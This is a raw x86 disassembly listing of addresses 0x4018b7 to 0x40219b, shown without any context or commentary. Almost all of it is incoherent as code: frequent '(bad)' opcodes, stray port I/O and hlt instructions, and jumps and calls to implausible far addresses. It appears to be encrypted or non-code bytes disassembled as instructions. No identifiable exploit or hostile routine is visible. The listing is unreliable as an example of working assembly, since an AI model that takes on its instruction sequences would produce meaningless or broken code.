  4018b7:	(bad)  
  4018b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018b9:	out    dx,eax
  4018ba:	fneni(8087 only) 
  4018bc:	and    eax,0xf90bf06a
  4018c1:	jmp    0x4018bf
  4018c3:	mov    ch,BYTE PTR [edi+esi*8-0x38]
  4018c7:	add    bh,BYTE PTR [ecx]
  4018c9:	out    0x3,eax
  4018cb:	add    BYTE PTR [edx],dl
  4018cd:	fcomp  QWORD PTR [ebp+0x1]
  4018d0:	dec    bl
  4018d2:	(bad)  
  4018d3:	(bad)  
  4018d4:	ins    BYTE PTR es:[edi],dx
  4018d5:	out    dx,eax
  4018d6:	fist   DWORD PTR [ecx+0x0]
	...
  4018e9:	add    BYTE PTR [eax],al
  4018eb:	add    ch,ch
  4018ed:	xor    eax,esi
  4018ef:	leave  
  4018f0:	sti    
  4018f1:	fiadd  DWORD PTR [ebx]
  4018f3:	push   ebp
  4018f4:	mov    dl,0x32
  4018f6:	test   ah,al
  4018f8:	aad    0xb0
  4018fa:	jl     0x401971
  4018fc:	cmp    eax,0x7c8d038d
  401901:	or     edx,DWORD PTR [ebx-0x1]
  401904:	inc    esp
  401905:	neg    DWORD PTR [ecx-0x1]
  401908:	sub    al,0xef
  40190a:	(bad)  [eax+0xb03e684]
  401910:	jns    0x401984
  401912:	or     DWORD PTR [ebx+0x7502e31c],eax
  401918:	add    BYTE PTR ds:[edx],dl
  40191b:	(bad)  
  40191c:	out    dx,eax
  40191d:	(bad)  
  40191e:	stos   DWORD PTR es:[edi],eax
  40191f:	add    BYTE PTR [ecx],bh
  401921:	test   DWORD PTR [eax+esi*8],ebp
  401924:	cmp    dh,al
  401926:	add    BYTE PTR [ecx+0x49],cl
  401929:	imul   ebx,DWORD PTR [edx-0x16ffc754],0x3
  401930:	pop    es
  401931:	(bad)  
  401932:	stos   DWORD PTR es:[edi],eax
  401933:	add    BYTE PTR [ecx],bh
  401935:	dec    ebx
  401936:	(bad)  
  401937:	loopne 0x4018f1
  401939:	mov    ebx,0xf04eef21
  40193e:	cmp    bl,BYTE PTR [ebx]
  401940:	bound  esp,QWORD PTR [ebp-0x17]
  401943:	pop    ecx
  401944:	cmp    DWORD PTR [esi-0x15],esp
  401947:	pop    ecx
  401948:	cmp    DWORD PTR [edx-0x16],ebx
  40194b:	pop    ebx
  40194c:	cmp    DWORD PTR [eax],eax
  40194e:	jmp    0x401a16
	...
  401963:	add    BYTE PTR [esi],ah
  401965:	jbe    0x40194c
  401967:	(bad)  [edi-0x2b]
  40196a:	jmp    0x6585d972
  40196f:	inc    esp
  401970:	test   DWORD PTR [ebx+0x5e],edx
  401973:	jns    0x4019a6
  401975:	fcomp  DWORD PTR [edx]
  401977:	out    dx,al
  401978:	(bad)  
  401979:	out    dx,eax
  40197a:	es dec ecx
  40197c:	icebp  
  40197d:	add    cl,ch
  40197f:	add    edi,DWORD PTR [ecx]
  401981:	jnp    0x401917
  401983:	sti    
  401984:	mov    bl,0x12
  401986:	fs dec ecx
  401988:	loope  0x4019da
  40198a:	rol    DWORD PTR [ebx-0x7f16ffc7],0xb4
  401991:	push   0x50c6ef1e
  401996:	push   ss
  401997:	jns    0x4019ca
  401999:	out    dx,eax
  40199a:	mov    ebx,0x16dbbff
  40199f:	add    al,0x24
  4019a1:	add    ebp,DWORD PTR [edx+0xef41da]
  4019a7:	jl     0x40193b
  4019a9:	jge    0x401930
  4019ab:	jno    0x401954
  4019ad:	out    dx,eax
  4019ae:	(bad)  
  4019af:	cmp    DWORD PTR [esi-0x122e038b],ebx
  4019b5:	out    dx,al
  4019b6:	call   esi
  4019b8:	sub    DWORD PTR [edi-0x526c148c],0xffffffff
  4019bf:	cmp    al,0x69
  4019c1:	fdivr  st,st(1)
  4019c3:	xchg   ebp,eax
  4019c4:	cmp    al,BYTE PTR [eax]
  4019c6:	mov    ebp,DWORD PTR [edx+0x0]
	...
  4019dc:	repz mov eax,0x553ae1c2
  4019e2:	mov    edx,DWORD PTR [ebp-0x61073b45]
  4019e8:	sar    ebx,0xe7
  4019eb:	pop    ebx
  4019ec:	push   ebx
  4019ed:	out    dx,eax
  4019ee:	jmp    DWORD PTR [eax-0x7f]
  4019f1:	call   0x6946bd
  4019f6:	add    cl,ch
  4019f8:	cmp    ch,bh
  4019fa:	jne    0x4019e1
  4019fc:	add    al,cl
  4019fe:	std    
  4019ff:	outs   dx,BYTE PTR ds:[esi]
  401a00:	daa    
  401a01:	jnp    0x401a58
  401a03:	cmc    
  401a04:	xchg   ebx,eax
  401a05:	adc    ch,BYTE PTR [edx-0x17]
  401a08:	pusha  
  401a09:	add    bh,bh
  401a0b:	fmul   QWORD PTR [esi]
  401a0d:	out    dx,eax
  401a0e:	jne    0x401a61
  401a10:	out    0x74,eax
  401a12:	or     BYTE PTR [esi+0x71],al
  401a15:	cld    
  401a16:	(bad)  
  401a17:	fwait
  401a18:	ss mov ecx,0x553ae1c2
  401a1e:	mov    edi,DWORD PTR ds:0x2ef8c3bb
  401a24:	sub    eax,0x3ae900
  401a2a:	(bad)  
  401a2b:	lods   al,BYTE PTR ds:[esi]
  401a2c:	into   
  401a2d:	(bad)  
  401a2e:	(bad)  
  401a2f:	call   0x95956e
  401a34:	test   al,0x69
  401a36:	adc    cl,BYTE PTR [ebp+0x6a50dadd]
  401a3c:	xchg   ecx,eax
  401a3d:	fnsave [ebp-0x4]
	...
  401a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a55:	jbe    0x401a4f
  401a57:	(bad)  
  401a58:	in     eax,dx
  401a59:	jmp    0x401a59
  401a5b:	push   edx
  401a5c:	mov    WORD PTR [edi+0x45],fs
  401a5f:	clc    
  401a60:	fld    st(1)
  401a62:	add    al,0x0
  401a64:	sub    eax,0x616aec69
  401a69:	ins    DWORD PTR es:[edi],dx
  401a6a:	inc    ebp
  401a6b:	or     al,0x40
  401a6d:	fnsave [ebp+0x8]
  401a70:	js     0x401a8e
  401a72:	cld    
  401a73:	jmp    DWORD PTR [edi+0x6008c2aa]
  401a79:	push   ebp
  401a7a:	mov    ebp,esp
  401a7c:	sub    bh,al
  401a7e:	mov    WORD PTR [ebp+0x54],es
  401a81:	push   edx
  401a82:	push   DWORD PTR [ebp+0x18]
  401a85:	retf   0xfc2a
  401a88:	mov    bh,0xdb
  401a8a:	leave  
  401a8b:	ret    0x228
  401a8e:	push   ebp
  401a8f:	mov    esi,DWORD PTR [edi+edi*2+0x76200c7d]
  401a96:	adc    al,0x83
  401a98:	adc    eax,0x16740012
  401a9d:	fnsave [ebp+0x10]
  401aa0:	addr16 jne 0x401aaf
  401aa3:	dec    DWORD PTR ds:0x7409e7ea
  401aa9:	(bad)  
  401aab:	leave  
  401aac:	adc    al,BYTE PTR [eax]
  401aae:	add    BYTE PTR [ebp+0x5b],dl
  401ab1:	loopne 0x401ab2
  401ab3:	jne    0x401aa5
  401ab5:	fdiv   QWORD PTR [ebp+0x8]
	...
  401acc:	sub    BYTE PTR [eax+0x7f27ffff],dh
  401ad2:	jge    0x401ae4
  401ad4:	cmp    edi,edx
  401ad6:	ja     0x401aec
  401ad8:	mov    edx,0x2affff7c
  401add:	cmc    
  401ade:	in     al,dx
  401adf:	jne    0x401b2a
  401ae1:	out    dx,al
  401ae2:	jbe    0x401af0
  401ae4:	sahf   
  401ae5:	ins    BYTE PTR es:[edi],dx
  401ae6:	sti    
  401ae7:	out    0xce,eax
  401ae9:	fsubp  st(4),st
  401aeb:	inc    DWORD PTR [eax-0x12000067]
  401af1:	jno    0x401ad2
  401af3:	cmp    esp,0xffffffe2
  401af6:	add    esi,DWORD PTR [ebx+eax*2-0x42]
  401afa:	jbe    0x401b08
  401afc:	popa   
  401afd:	out    dx,eax
  401afe:	xlat   BYTE PTR ds:[ebx]
  401aff:	add    BYTE PTR [ecx],bh
  401b01:	rol    BYTE PTR [ecx],cl
  401b03:	sub    edi,DWORD PTR [ecx+0x7]
  401b06:	in     eax,dx
  401b07:	jne    0x401b4e
  401b09:	sahf   
  401b0a:	jbe    0x401b14
  401b0c:	popa   
  401b0d:	dec    edx
  401b0e:	in     al,dx
  401b0f:	inc    DWORD PTR [esi-0x50]
  401b12:	ror    DWORD PTR [eax],0x39
  401b15:	sub    al,0x79
  401b17:	in     al,dx
  401b18:	mov    edx,0xa4ff13fb
  401b1d:	hlt    
  401b1e:	in     al,dx
  401b1f:	jne    0x401b56
  401b21:	outs   dx,BYTE PTR ds:[esi]
  401b22:	jbe    0x401b2c
  401b24:	adc    DWORD PTR [esi-0x7de90014],ebx
  401b2a:	std    
  401b2b:	inc    BYTE PTR [edi+eiz*8+0x75ec]
	...
  401b42:	add    BYTE PTR [eax],al
  401b44:	xor    eax,0x1108764e
  401b49:	(bad)  
  401b4a:	in     al,dx
  401b4b:	push   esi
  401b4d:	pop    ds
  401b4e:	ror    DWORD PTR [ecx+edi*1],0x8c
  401b52:	js     0x401b40
  401b54:	out    0xb3,al
  401b56:	sti    
  401b57:	out    0xde,eax
  401b59:	xor    al,0xec
  401b5b:	jmp    FWORD PTR [ecx-0x3f]
  401b5e:	sti    
  401b5f:	addr16 mov bh,0xff
  401b62:	rol    BYTE PTR [edx+0x39],1
  401b65:	in     eax,dx
  401b66:	xchg   esp,eax
  401b67:	sti    
  401b68:	(bad)  
  401b69:	cmp    BYTE PTR [esi],dl
  401b6b:	in     al,dx
  401b6c:	mov    dh,0x59
  401b6e:	jmp    0x1138405f
  401b73:	pop    ds
  401b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b75:	in     al,dx
  401b76:	(bad)  
  401b77:	pop    eax
  401b78:	cmp    edi,DWORD PTR [ebx-0x54]
  401b7b:	inc    DWORD PTR [esi]
  401b7d:	in     eax,dx
  401b7e:	je     0x401b7b
  401b80:	xchg   esi,eax
  401b81:	xor    dh,ah
  401b83:	jmp    0x401b0b
  401b85:	pop    ecx
  401b86:	jmp    0x401c00
  401b88:	hlt    
  401b89:	(bad)  
  401b8b:	jmp    0x401b79
  401b8d:	test   eax,0xc6ec6e21
  401b93:	dec    esp
  401b94:	jo     0x401b57
  401b96:	in     eax,dx
  401b97:	add    eax,DWORD PTR [ecx+edi*2]
  401b9a:	lds    eax,FWORD PTR [edi+0x71aeeb7d]
  401ba0:	inc    ecx
  401ba1:	fsub   st,st(3)
  401ba3:	in     eax,dx
  401ba4:	inc    esi
  401ba5:	in     al,dx
  401ba6:	rol    BYTE PTR [eax+0x0],cl
	...
  401bb9:	add    BYTE PTR [eax],al
  401bbb:	add    BYTE PTR ds:0xbae82c77,ch
  401bc1:	inc    ebp
  401bc2:	(bad)  
  401bc4:	mov    al,ds:0x35718600
  401bc9:	jmp    0x401bbf
  401bcb:	sti    
  401bcc:	push   ss
  401bcd:	fnsave [eax-0x15]
  401bd0:	push   ss
  401bd1:	in     al,dx
  401bd2:	hlt    
  401bd3:	out    0xe,eax
  401bd5:	jbe    0x401bc8
  401bd7:	fnclex 
  401bd9:	jmp    0xdbe1:0x75feeb5e
  401be0:	dec    ebp
  401be1:	in     al,dx
  401be2:	dec    esi
  401be3:	jmp    0x401ba7
  401be5:	inc    ebp
  401be6:	inc    ebp
  401be7:	mov    ebp,0x50e8f8fb
  401bec:	mov    dl,0xdc
  401bee:	add    BYTE PTR [edx-0x7],ch
  401bf1:	hlt    
  401bf2:	(bad)  
  401bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bf4:	fiadd  WORD PTR [eax]
  401bf6:	add    cl,ch
  401bf8:	cmp    bh,BYTE PTR [ebp+0x45]
  401bfb:	sbb    eax,0xe175eb65
  401c00:	xchg   edx,eax
  401c01:	push   esp
  401c02:	aam    0xe9
  401c04:	cmp    al,BYTE PTR [ebp-0x14be7e40]
  401c0a:	jne    0x401bfd
  401c0c:	and    ah,0xf9
  401c0f:	mul    BYTE PTR [ebx-0x5c0eba87]
  401c15:	jne    0x401c13
  401c17:	shl    DWORD PTR [ecx],1
  401c19:	iret   
  401c1a:	add    cl,ch
  401c1c:	jg     0x401bc9
  401c1e:	je     0x401c1f
	...
  401c34:	arpl   WORD PTR [ebp-0x8],si
  401c37:	cmp    DWORD PTR [edi],ecx
  401c39:	add    al,ch
  401c3b:	cmp    BYTE PTR [eax],bh
  401c3d:	add    BYTE PTR [eax],al
  401c3f:	jo     0x401c3a
  401c41:	repz (bad) 
  401c43:	cmp    al,0x61
  401c45:	fmul   DWORD PTR [ecx]
  401c47:	call   0xe345:0x1cff003a
  401c4e:	mov    ebx,0x8beb53a2
  401c53:	sub    al,0x29
  401c55:	sti    
  401c56:	(bad)  
  401c57:	xchg   esi,eax
  401c58:	or     dl,BYTE PTR [eax-0x1]
  401c5b:	cld    
  401c5c:	and    ah,bl
  401c5e:	push   0x7f
  401c60:	adc    ebp,ebx
  401c62:	leave  
  401c63:	stos   DWORD PTR es:[edi],eax
  401c64:	push   ss
  401c65:	jmp    0x401cbb
  401c67:	(bad)  
  401c68:	out    0x7e,al
  401c6a:	les    ebx,FWORD PTR [ecx-0x5]
  401c6d:	inc    esp
  401c6e:	hlt    
  401c6f:	jmp    0x64401cae
  401c74:	jns    0x401c62
  401c76:	push   eax
  401c77:	dec    esi
  401c78:	imul   edi,eax,0xd28e00e7
  401c7e:	add    BYTE PTR [eax],al
  401c80:	push   ebp
  401c81:	mov    edi,0x700f4d78
  401c86:	or     al,ch
  401c88:	sahf   
  401c89:	(bad)  
  401c8b:	dec    DWORD PTR [ecx+0x40]
  401c8e:	clc    
  401c8f:	sbb    DWORD PTR [ebp+0x7c7204d6],0xffffff81
  401c96:	ins    DWORD PTR es:[edi],dx
  401c97:	clc    
	...
  401cac:	xchg   esp,eax
  401cad:	aad    0x75
  401caf:	cld    
  401cb0:	dec    eax
  401cb1:	mov    dl,dl
  401cb3:	add    BYTE PTR [eax-0x2d8b4017],dl
  401cb9:	aad    0x75
  401cbb:	clc    
  401cbc:	mov    al,0x4c
  401cbe:	add    al,ch
  401cc0:	xchg   ecx,eax
  401cc1:	jmp    0xa6d01cc5
  401cc6:	not    eax
  401cc8:	fldcw  WORD PTR [edx]
  401cca:	hlt    
  401ccb:	inc    DWORD PTR ds:0xc295e8d8
  401cd1:	add    eax,DWORD PTR [eax]
  401cd3:	jmp    0x401c5b
  401cd5:	xlat   BYTE PTR ds:[ebx]
  401cd6:	jne    0x401ce0
  401cd8:	js     0x401d04
  401cda:	sti    
  401cdb:	call   FWORD PTR [edi-0x6d363ff4]
  401ce1:	(bad)  
  401ce2:	(bad)  
  401ce3:	jmp    0xe2:0xc9c00b56
  401cea:	add    BYTE PTR [edx+0x22],ch
  401ced:	dec    esp
  401cee:	cld    
  401cef:	jmp    DWORD PTR ds:0xb8f0e7e6
  401cf5:	xlat   BYTE PTR ds:[ebx]
  401cf6:	inc    edi
  401cf8:	gs hlt 
  401cfa:	add    DWORD PTR [eax],eax
  401cfc:	and    dh,bh
  401cfe:	mov    WORD PTR [ebp+0x60],es
  401d01:	push   esp
  401d02:	push   DWORD PTR [ebp+0x8]
  401d05:	(bad)  
  401d06:	sar    bl,cl
  401d08:	cmp    DWORD PTR [edx-0x17],edx
  401d0b:	sub    DWORD PTR [edi+eax*2+0x4],0x74
	...
  401d24:	dec    ebx
  401d25:	repnz mov ebx,0x6f33743b
  401d2b:	pop    es
  401d2c:	xchg   ecx,eax
  401d2d:	fadd   DWORD PTR [ebx]
  401d2f:	add    BYTE PTR [ecx],bh
  401d31:	add    ch,BYTE PTR ds:[ebx]
  401d34:	stc    
  401d35:	push   cs
  401d36:	push   es
  401d37:	sub    edi,ecx
  401d39:	xor    dh,al
  401d3b:	add    al,0x39
  401d3d:	lods   al,BYTE PTR ds:[esi]
  401d3e:	jl     0x401d2c
  401d40:	mov    edx,0xfc8dec23
  401d45:	add    dl,BYTE PTR [edi+edi*8+0x24]
  401d49:	out    dx,eax
  401d4a:	fisttp DWORD PTR [eax+0x6a]
  401d4d:	xlat   BYTE PTR ds:[ebx]
  401d4e:	add    eax,DWORD PTR [ebp-0xe39087]
  401d54:	or     al,0xef
  401d56:	fcmovnu st,st(0)
  401d58:	or     edx,0xcefc89e8
  401d5e:	call   0x12ff8ad8
  401d63:	sar    BYTE PTR [ecx],cl
  401d65:	xlat   BYTE PTR ds:[ebx]
  401d66:	cld    
  401d67:	mov    edi,0x75e8d2e5
  401d6c:	inc    ebp
  401d6d:	mov    dl,0x6e
  401d6f:	clc    
  401d70:	jmp    0x394b3533
  401d75:	xlat   BYTE PTR ds:[ebx]
  401d76:	call   0xe8cf5af0
  401d7b:	sar    DWORD PTR [ecx],1
  401d7d:	xlat   BYTE PTR ds:[ebx]
  401d7e:	call   0xb2bf5ef8
  401d83:	cli    
  401d84:	cmp    BYTE PTR es:[edx+0xc2],0x0
	...
  401d9c:	xor    edi,edx
  401d9e:	dec    esi
  401d9f:	mov    esp,DWORD PTR ds:0x6ae8bf56
  401da5:	mov    esi,0x7c8dcc
  401daa:	gs push ebx
  401dac:	(bad)  
  401dad:	jb     0x401da0
  401daf:	fcomi  st,st(1)
  401db1:	int    0xe9
  401db3:	add    esi,DWORD PTR [edi+edi*4-0x518422]
  401dba:	call   0xf1b2fbc2
  401dbf:	fstp   TBYTE PTR [ebp-0x3f17c919]
  401dc5:	inc    edx
  401dc6:	xor    eax,0x11ec4ce8
  401dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dcc:	call   0xf73d06d0
  401dd1:	clc    
  401dd2:	ins    BYTE PTR es:[edi],dx
  401dd3:	xchg   DWORD PTR [ecx],edi
  401dd5:	add    cl,ch
  401dd7:	jp     0x401dd5
  401dd9:	out    dx,eax
  401dda:	push   es
  401ddb:	outs   dx,BYTE PTR ds:[esi]
  401ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ddd:	xlat   BYTE PTR ds:[ebx]
  401dde:	sub    ebx,edx
  401de0:	cmp    DWORD PTR [eax],eax
  401de2:	push   0xffffffbf
  401de4:	xor    eax,0xe903e903
  401de9:	(bad)  
  401dea:	cmp    ah,bl
  401dec:	sar    bh,1
  401dee:	call   0xc582ddf6
  401df3:	out    0xe4,eax
  401df5:	repz rcl DWORD PTR [edi-0x7d1700b0],0x75
  401dfd:	add    esp,esp
  401dff:	add    eax,DWORD PTR [eax]
	...
  401e11:	add    BYTE PTR [eax],al
  401e13:	add    BYTE PTR [ecx],bh
  401e15:	adc    cl,ch
  401e17:	push   ebx
  401e18:	popa   
  401e19:	(bad)
  401e1d:	ja     0x401e4b
  401e1f:	(bad)  
  401e21:	call   FWORD PTR [ebp+0x1ce82571]
  401e27:	lock outs dx,BYTE PTR cs:[esi]
  401e2a:	and    edi,0x8d91f0ac
  401e30:	adc    BYTE PTR [ecx],al
  401e32:	jmp    0x4d1bb9
  401e37:	pusha  
  401e38:	js     0x401e22
  401e3a:	push   esp
  401e3c:	push   ds
  401e3d:	fldenv [ebp+0x38]
  401e40:	xor    eax,0xf2d4ff00
  401e45:	fist   WORD PTR [eax+0x6ae7d653]
  401e4b:	loope  0x401dcf
  401e4d:	pop    eax
  401e4e:	sub    BYTE PTR [eax-0xe8a18c6],ch
  401e54:	repnz (bad) 
  401e56:	cld    
  401e57:	ss (bad) 
  401e59:	sti    
  401e5a:	xlat   BYTE PTR ds:[ebx]
  401e5b:	cs dec eax
  401e5d:	in     al,dx
  401e5e:	call   FWORD PTR [edx+eax*8-0x61e24521]
  401e65:	out    0x23,eax
  401e67:	xor    DWORD PTR [esi+0x280ef86d],edx
  401e6d:	fdivr  st,st(7)
  401e6f:	jl     0x401e13
  401e71:	fnstsw ax
  401e73:	std    
  401e74:	lahf   
  401e75:	out    0x23,eax
  401e77:	adc    DWORD PTR [eax],eax
	...
  401e89:	add    BYTE PTR [eax],al
  401e8b:	add    BYTE PTR [esi+0x3601ec6d],dl
  401e91:	add    BYTE PTR [eax],al
  401e93:	jmp    0xd2288c2f
  401e98:	outs   dx,DWORD PTR ds:[esi]
  401e99:	out    0xff,eax
  401e9b:	jmp    0xc1488bf7
  401ea0:	(bad)  
  401ea1:	jmp    0xc323e5a5
  401ea6:	pop    ebx
  401ea7:	mov    al,0x78
  401ea9:	cld    
  401eaa:	call   FWORD PTR [ebx]
  401eac:	rcl    bl,cl
  401eae:	sub    DWORD PTR [eax*2+0x57f173e7],0x6d
  401eb6:	or     BYTE PTR [ecx-0x16ff2ec7],dl
  401ebc:	push   ebx
  401ebd:	ror    cl,0xab
  401ec0:	es out 0x54,eax
  401ec3:	add    BYTE PTR [ebx+0x8458bcf],ch
  401ec9:	add    BYTE PTR [eax+0x50032000],al
  401ecf:	push   0x50
  401ed1:	(bad)  
  401ed2:	repnz rcl BYTE PTR [eax],1
  401ed5:	add    ecx,ecx
  401ed7:	ret    0x2dc
  401eda:	push   ebp
  401edb:	mov    esi,DWORD PTR [esi+esi*1-0x4]
  401edf:	mov    esi,ebp
  401ee1:	jmp    0x510e:0xe1e44d8a
  401ee8:	and    esp,eax
  401eea:	add    ch,BYTE PTR [ebx]
  401eec:	and    dl,dh
  401eee:	stos   DWORD PTR es:[edi],eax
  401eef:	pop    ecx
	...
  401f04:	push   ebx
  401f05:	fadd   QWORD PTR [ebx]
  401f07:	repz push 0x3e
  401f0a:	leave  
  401f0b:	ret    0x2a8
  401f0e:	push   ebp
  401f0f:	mov    esi,DWORD PTR [esi*1-0x114a74a9]
  401f16:	sti    
  401f17:	mov    ebx,DWORD PTR ds:0x704d8aeb
  401f1d:	loope  0x401f21
  401f1f:	repz cld 
  401f21:	cmp    eax,0xef52c95e
  401f26:	call   DWORD PTR [ebx+ecx*1-0x38]
  401f2a:	push   esi
  401f2b:	push   edi
  401f2c:	jmp    0x401f84
  401f2e:	or     ah,bh
  401f30:	fld    TBYTE PTR [esi]
  401f32:	adc    BYTE PTR [ebx],ch
  401f34:	nop
  401f35:	push   0x1730c7d
  401f3a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f3c:	dec    ebx
  401f3d:	test   eax,0x3d200175
  401f42:	pop    esi
  401f43:	leave  
  401f44:	xchg   edx,eax
  401f45:	out    0xff,eax
  401f47:	push   esp
  401f48:	retf   
  401f49:	mov    DWORD PTR [ebx+0x5736d4c4],0x1ff3953
  401f53:	add    DWORD PTR [ecx],edi
  401f55:	xlat   BYTE PTR ds:[ebx]
  401f56:	in     al,0x75
  401f58:	xor    DWORD PTR [edi+0x6716ff93],ecx
  401f5e:	jns    0x401fdd
  401f60:	inc    ecx
  401f61:	push   ss
  401f62:	cmp    eax,0x430eb2b
  401f67:	add    DWORD PTR [eax],eax
	...
  401f79:	add    BYTE PTR [eax],al
  401f7b:	add    BYTE PTR [ecx],bh
  401f7d:	xlat   BYTE PTR ds:[ebx]
  401f7e:	jnp    0x401f94
  401f80:	xor    eax,DWORD PTR [ebp-0x3e]
  401f83:	loop   0x401f75
  401f85:	bound  esp,QWORD PTR [edi+0x8]
  401f88:	jle    0x401f28
  401f8a:	js     0x402001
  401f8c:	sub    eax,0x39fe3f15
  401f91:	adc    bh,BYTE PTR [ebx+0x61f22b]
  401f97:	cmp    esi,DWORD PTR [ecx+0x7400e49c]
  401f9d:	sbb    eax,0xd768047a
  401fa2:	ds (bad) 
  401fa4:	ds inc ebp
  401fa6:	dec    edi
  401fa7:	(bad)  
  401fa8:	mov    bl,0xdb
  401faa:	sub    DWORD PTR [eax+0x4579c235],ecx
  401fb0:	xchg   esi,eax
  401fb1:	outs   dx,DWORD PTR ds:[esi]
  401fb2:	add    BYTE PTR [edx],bh
  401fb4:	clc    
  401fb5:	mov    cl,0x36
  401fb7:	adc    BYTE PTR [ebx],cl
  401fb9:	fstp   DWORD PTR [eax]
  401fbb:	leave  
  401fbc:	jg     0x401f58
  401fbe:	outs   dx,BYTE PTR ds:[esi]
  401fbf:	aad    0x12
  401fc1:	es inc esi
  401fc3:	leave  
  401fc4:	jnp    0x401fa1
  401fc6:	add    edx,DWORD PTR [ebp-0x4e]
  401fc9:	mov    ds:0xa61c480,eax
  401fce:	dec    esi
  401fcf:	push   edi
  401fd0:	push   esi
  401fd1:	sub    al,0xfc
  401fd3:	pop    edx
  401fd4:	ret    
  401fd5:	fidivr DWORD PTR [ebx+0x45]
  401fd8:	inc    esp
  401fd9:	popa   
  401fda:	inc    eax
  401fdb:	add    DWORD PTR [ecx+0xe82c00],esi
	...
  401ff1:	add    BYTE PTR [eax],al
  401ff3:	add    dl,al
  401ff5:	call   0x6b025d20
  401ffa:	in     eax,0xbc
  401ffc:	jl     0x401fe6
  401ffe:	jmp    0x72405906
  402003:	ss sub ecx,esp
  402006:	sub    esi,esp
  402008:	je     0x401fed
  40200a:	out    0xad,al
  40200c:	jl     0x401ff1
  40200e:	fisubr WORD PTR [ebp+0x4e712825]
  402014:	idiv   bh
  402016:	mov    bl,0xe7
  402018:	ds scas al,BYTE PTR es:[edi]
  40201a:	lods   al,BYTE PTR ds:[esi]
  40201b:	out    0xb3,eax
  40201d:	or     edx,DWORD PTR [ecx]
  40201f:	jl     0x401fa5
  402021:	out    0xf6,al
  402023:	lods   eax,DWORD PTR ds:[esi]
  402024:	jl     0x402009
  402026:	jno    0x402037
  402028:	adc    ebp,esi
  40202a:	jle    0x40206a
  40202c:	lds    edi,FWORD PTR [ecx-0x6c]
  40202f:	in     al,0xb1
  402031:	or     esp,ecx
  402033:	jns    0x402041
  402035:	in     eax,0xeb
  402037:	dec    esi
  402038:	scas   eax,DWORD PTR es:[edi]
  402039:	jns    0x402038
  40203b:	sub    DWORD PTR [edx+0x4533113a],esi
  402041:	xor    BYTE PTR [esi],al
  402043:	ds xchg ecx,eax
  402045:	loope  0x402070
  402047:	jns    0x40203d
  402049:	loop   0x4020ac
  40204b:	add    BYTE PTR [ebx-0x58512c6],dh
  402051:	inc    BYTE PTR [ebp+0x42]
  402054:	adc    dh,BYTE PTR [edi+0x10ab]
	...
  40206a:	add    BYTE PTR [eax],al
  40206c:	cmp    DWORD PTR [ebx+0x62],ecx
  40206f:	lock mov eax,0x5ee2bdbb
  402075:	in     al,0x1a
  402077:	das    
  402078:	jb     0x4020ec
  40207a:	and    al,0xe0
  40207c:	jmp    0x357c2165
  402081:	fsub   DWORD PTR [ebx-0x7affca67]
  402087:	test   eax,0xe996784a
  40208c:	cmp    al,BYTE PTR [eax]
  40208e:	call   FWORD PTR [esi*1+0x1a972fd8]
  402095:	in     al,0x89
  402097:	sub    al,0xf1
  402099:	jecxz  0x402110
  40209b:	jge    0x4020ba
  40209d:	pop    ecx
  40209e:	iret   
  40209f:	jmp    0xf60017de
  4020a4:	fwait
  4020a5:	jns    0x4020ec
  4020a7:	pop    ecx
  4020a8:	fisubr DWORD PTR [ebp-0xc]
  4020ab:	push   ecx
  4020ac:	arpl   dx,sp
  4020ae:	call   DWORD PTR [esi-0x4c]
  4020b1:	cmp    eax,0xec804ef8
  4020b6:	(bad)  
  4020b7:	mov    esp,0x3975e3f2
  4020bc:	fnsave [esi+edi*8+0x36]
  4020c0:	(bad)  
  4020c2:	jne    0x4020f1
  4020c4:	int    0x3a
  4020c6:	iret   
  4020c7:	jmp    0xedb60406
  4020cc:	mov    ds:0xe9cf2e,al
	...
  4020e1:	add    BYTE PTR [eax],al
  4020e3:	add    BYTE PTR [edx],bh
  4020e5:	push   eax
  4020e6:	call   DWORD PTR [esi+ebp*1-0x64e87a8b]
  4020ed:	jecxz  0x4020ee
  4020ef:	cdq    
  4020f0:	mov    ds:0x9bf6fe9d,al
  4020f5:	jecxz  0x40216c
  4020f7:	cmc    
  4020f8:	fwait
  4020f9:	ins    DWORD PTR es:[edi],dx
  4020fa:	clc    
  4020fb:	je     0x4020be
  4020fd:	sar    dh,cl
  4020ff:	ficomp WORD PTR [ebx+0x50]
  402102:	call   0x2379de
  402107:	into   
  402108:	add    eax,edi
  40210a:	out    0x0,eax
  40210c:	daa    
  40210d:	(bad)  
  40210e:	(bad)  
  40210f:	(bad)  
  402110:	jmp    0x3d:0x387367f3
  402117:	inc    DWORD PTR ds:0xda93e7f4
  40211d:	(bad)  
  40211f:	or     edi,eax
  402121:	fnsave [ebp-0xc]
  402124:	iret   
  402125:	inc    edi
  402126:	clc    
  402127:	inc    DWORD PTR [ebp-0xc]
  40212a:	out    0x83,eax
  40212c:	mov    edx,0xd823ffdd
  402131:	fnsave [ebp-0x8]
  402134:	mov    eax,0x8ffffda1
  402139:	fidiv  WORD PTR [ebp+0x8]
  40213c:	mov    BYTE PTR [eax+0x728ffff7],al
  402142:	ret    
  402143:	pop    ebx
  402144:	sbb    DWORD PTR [ebp+0x8],edi
	...
  40215a:	add    BYTE PTR [eax],al
  40215c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40215d:	jno    0x40214b
  40215f:	and    DWORD PTR [ebx+ecx*8],0x57
  402163:	mov    edx,DWORD PTR [ebp-0x7b3ff516]
  402169:	clc    
  40216a:	mov    BYTE PTR [eax],0xd0
  40216d:	(bad)  
  40216e:	(bad)  
  40216f:	dec    DWORD PTR [ebx+0x387d83dd]
  402175:	std    
  402176:	je     0x40217f
  402178:	or     bh,bh
  40217a:	add    DWORD PTR [eax],eax
  40217c:	nop
  40217d:	ror    DWORD PTR [edi],1
  40217f:	cmp    DWORD PTR [ebp-0x688afe1a],0xffffff84
  402186:	add    BYTE PTR [ecx],al
  402188:	nop
  402189:	(bad)  
  40218a:	jmp    0x39ca:0x81ac7b02
  402191:	cld    
  402192:	add    DWORD PTR [eax],eax
  402194:	fnstsw WORD PTR [edx]
  402196:	cld    
  402197:	push   eax
  402198:	cmp    DWORD PTR [edi],esp
  40219a:	outs   dx,BYTE PTR ds:[esi]
  40219b:	add    BYTE PTR [esi+0x4b],bl
